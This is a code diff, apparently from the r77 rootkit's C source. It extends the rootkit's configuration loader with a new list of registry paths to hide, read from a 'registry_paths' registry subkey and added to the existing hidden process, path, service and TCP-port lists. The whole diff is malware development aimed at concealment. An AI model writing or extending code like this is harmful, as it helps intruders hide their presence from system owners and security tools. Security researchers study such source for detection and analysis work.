@@ -9,6 +9,7 @@ PR77_CONFIG LoadR77Config()
 	config->HiddenProcessIds = CreateIntegerList();
 	config->HiddenProcessNames = CreateStringList(TRUE);
 	config->HiddenPaths = CreateStringList(TRUE);
+	config->HiddenRegistryPaths = CreateStringList(TRUE);
 	config->HiddenServiceNames = CreateStringList(TRUE);
 	config->HiddenTcpLocalPorts = CreateIntegerList();
 	config->HiddenTcpRemotePorts = CreateIntegerList();
@@ -48,6 +49,14 @@ PR77_CONFIG LoadR77Config()
 		{
 			LoadStringListFromRegistryKey(config->HiddenPaths, pathKey, MAX_PATH);
 			RegCloseKey(pathKey);
+		}
+
+		// Read paths from the "registry_paths" subkey.
+		HKEY registryPathKey;
+		if (RegOpenKeyExW(key, L"registry_paths", 0, KEY_READ, &registryPathKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->HiddenRegistryPaths, registryPathKey, 1000);
+			RegCloseKey(registryPathKey);
 		}
 
 		// Read service names from the "service_names" subkey.
@@ -93,6 +102,7 @@ VOID DeleteR77Config(PR77_CONFIG config)
 	DeleteIntegerList(config->HiddenProcessIds);
 	DeleteStringList(config->HiddenProcessNames);
 	DeleteStringList(config->HiddenPaths);
+	DeleteStringList(config->HiddenRegistryPaths);
 	DeleteStringList(config->HiddenServiceNames);
 	DeleteIntegerList(config->HiddenTcpLocalPorts);
 	DeleteIntegerList(config->HiddenTcpRemotePorts);
@@ -118,6 +128,7 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 			CompareIntegerList(configA->HiddenProcessIds, configB->HiddenProcessIds) &&
 			CompareStringList(configA->HiddenProcessNames, configB->HiddenProcessNames) &&
 			CompareStringList(configA->HiddenPaths, configB->HiddenPaths) &&
+			CompareStringList(configA->HiddenRegistryPaths, configB->HiddenRegistryPaths) &&
 			CompareStringList(configA->HiddenServiceNames, configB->HiddenServiceNames) &&
 			CompareIntegerList(configA->HiddenTcpLocalPorts, configB->HiddenTcpLocalPorts) &&
 			CompareIntegerList(configA->HiddenTcpRemotePorts, configB->HiddenTcpRemotePorts) &&
